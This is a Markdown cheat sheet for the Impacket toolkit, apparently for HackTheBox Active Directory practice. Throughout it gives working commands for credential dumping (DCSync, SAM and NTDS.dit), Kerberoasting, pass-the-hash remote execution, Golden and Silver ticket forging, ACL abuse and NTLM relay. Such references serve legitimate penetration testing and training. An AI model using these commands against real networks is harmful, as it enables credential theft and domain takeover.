# Impacket Toolkit Reference

> A collection of Python classes for working with network protocols, plus
> dozens of attack scripts. Universal across IppSec's AD content.

## Installation

```bash
# Kali / Parrot ship it as `impacket-*` wrappers
which impacket-secretsdump

# from source (latest)
pip install impacket
# or
git clone https://github.com/fortra/impacket && cd impacket && pip install .
```

## Authentication arguments (universal)

Every impacket script accepts:

```
<domain>/<user>:<password>@<target>
<domain>/<user>@<target> -hashes <LMHASH>:<NTLMHASH>
<domain>/<user>@<target> -no-pass         (with -k for Kerberos)
-dc-ip <ip>                                (when DNS is broken)
-k                                         (use Kerberos via KRB5CCNAME)
-no-pass                                   (don't prompt for a password)
-debug                                     (verbose protocol logging)
```

LM-hash placeholder:
```
:<NTLM>          # e.g., :32693b11e6aa90eb43d32c72a07ceea6
aad3b...:<NTLM>  # the standard LM:NTLM colon-pair
```

## Cheat-sheet by script

### `impacket-secretsdump` — DCSync, SAM, NTDS.dit dump

```bash
# DCSync (with creds + ACL rights)
impacket-secretsdump <dom>/<user>:<pass>@<dc-ip>
impacket-secretsdump -just-dc -just-dc-user krbtgt <dom>/<user>:<pass>@<dc-ip>

# Local SAM/SECURITY/SYSTEM (when you have local admin / files)
impacket-secretsdump LOCAL -system SYSTEM -sam SAM -security SECURITY
# from registry hives
impacket-secretsdump -system system.save -sam sam.save LOCAL

# Remote NTDS.dit grab (DA / Backup Operators)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### `impacket-GetNPUsers` — AS-REP roasting

```bash
impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass -dc-ip <ip> \
  -format hashcat -outputfile asrep.hashes
impacket-GetNPUsers <dom>/<user> -no-pass -dc-ip <ip>
```

Output mode `18200` for hashcat, `john` mode `krb5asrep`.

### `impacket-GetUserSPNs` — Kerberoasting

```bash
impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <ip>            # list only
impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <ip> -request \
  -outputfile kerberoast.hashes -format hashcat
```

Output mode `13100` for hashcat.

### `impacket-psexec` — RCE via SMB service install (loud, SYSTEM)

```bash
impacket-psexec <dom>/Administrator:<pass>@<ip>
impacket-psexec -hashes :<NTLM> <dom>/Administrator@<ip>
```

### `impacket-wmiexec` — quieter command exec via WMI

```bash
impacket-wmiexec <dom>/<u>:<p>@<ip>
impacket-wmiexec -hashes :<NTLM> <dom>/<u>@<ip>
```

### `impacket-smbexec` — service-based, alternative to psexec

```bash
impacket-smbexec <dom>/<u>:<p>@<ip>
```

### `impacket-smbclient` — Pythonic smbclient (supports hashes)

```bash
impacket-smbclient <dom>/<u>:<p>@<ip>
impacket-smbclient -hashes :<NTLM> <dom>/<u>@<ip>
> shares
> use <share>
> ls
> get file
> put file
```

### `impacket-getTGT` / `impacket-getST` — Kerberos ticket flow

```bash
# get a TGT from cred or hash
impacket-getTGT <dom>/<u>:<p>
impacket-getTGT <dom>/<u> -hashes :<NTLM>

# request a TGS for a service, optionally impersonating
impacket-getST -spn 'cifs/<host>.<dom>' <dom>/<u>:<p>
impacket-getST -spn 'cifs/<host>.<dom>' -impersonate Administrator <dom>/<u>:<p>

# use the ticket
export KRB5CCNAME=<u>.ccache
impacket-psexec -k -no-pass <dom>/<u>@<host>.<dom>
```

### `impacket-ticketer` — Golden / Silver tickets

```bash
# Golden Ticket from krbtgt
impacket-ticketer -nthash <krbtgt-NTLM> -domain-sid <SID> -domain <dom> Administrator
# Silver Ticket for a specific service
impacket-ticketer -nthash <svc-acct-NTLM> -domain-sid <SID> -domain <dom> -spn cifs/host.dom Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass Administrator@<host>
```

### `impacket-lookupsid` — SID brute over IPC$

```bash
# even from null (when allowed)
impacket-lookupsid '<dom>/'@<ip>
# returns user/group SIDs and types
```

### `impacket-addspn` — set/remove SPN (targeted Kerberoast)

```bash
impacket-addspn -u <u> -p '<p>' -t <target> 'fake/spn' <dc-ip>
impacket-addspn -u <u> -p '<p>' -t <target> 'fake/spn' <dc-ip> -r   # remove
```

### `impacket-rbcd` — Resource-Based Constrained Delegation

```bash
impacket-rbcd -delegate-from 'fake$' -delegate-to '<victim$>' -action write '<dom>/<u>:<p>'
```

### `impacket-addcomputer` — add machine account (no DA needed; default 10/user)

```bash
impacket-addcomputer -computer-name 'fake$' -computer-pass 'Pass123!' -dc-ip <ip> '<dom>/<u>:<p>'
```

### `impacket-dacledit` — LDAP ACL editor

```bash
# read existing ACL
impacket-dacledit -action read -principal '<u>' -target-dn 'DC=...,DC=...' '<dom>/<u>:<p>'

# write a DCSync grant
impacket-dacledit -action write -rights DCSync -principal '<u>' -target-dn 'DC=...,DC=...' '<dom>/<u>:<p>'
```

### `impacket-mssqlclient` — MSSQL client

```bash
impacket-mssqlclient <dom>/<u>:<p>@<ip>     # default Windows auth
impacket-mssqlclient -windows-auth <dom>/<u>:<p>@<ip>
> enable_xp_cmdshell
> xp_cmdshell whoami
```

### `impacket-smbserver` — share files from your attacker box

```bash
sudo impacket-smbserver share .            # serves cwd as \\<atk>\share
# anonymous SMBv2-only:
sudo impacket-smbserver share . -smb2support
# auth required:
sudo impacket-smbserver share . -username pen -password test
```

### `impacket-ntlmrelayx` — NTLM relay

```bash
sudo impacket-ntlmrelayx -t smb://<victim> -smb2support     # relay to SMB
sudo impacket-ntlmrelayx -t ldap://<dc> --escalate-user <our-user>   # escalate
sudo impacket-ntlmrelayx -tf targets.txt -socks                       # SOCKS-relay
```

## Common Pitfalls

| Issue | Fix |
|---|---|
| `KRB_AP_ERR_SKEW` | `sudo ntpdate <dc-ip>` or use `faketime` |
| Wrong realm casing | use exact realm string from `nmap ldap-rootdse` |
| `STATUS_LOGON_FAILURE` | check `<DOMAIN>/<user>` syntax; verify cred |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | user doesn't exist on this DC, or domain wrong |
| ImportError on impacket scripts | venv issue; reinstall in current env |
| Ccache path | `export KRB5CCNAME=/full/path/.ccache` |

## Real HTB Examples

Used on every AD box from the sample:
- **Forest** — secretsdump, GetNPUsers
- **Sauna** — secretsdump, GetNPUsers
- **Active** — secretsdump, GetUserSPNs, psexec
- **Cascade** — smbclient
- **Jeeves** — psexec for PtH

## Related Skills

- [`tool-usage/crackmapexec.md`](crackmapexec.md)
- [`tool-usage/evil-winrm.md`](evil-winrm.md)
- [`active-directory/dcsync.md`](../active-directory/dcsync.md)
- [`active-directory/kerberoasting.md`](../active-directory/kerberoasting.md)
- [`methodology/10-lateral-movement.md`](../methodology/10-lateral-movement.md)
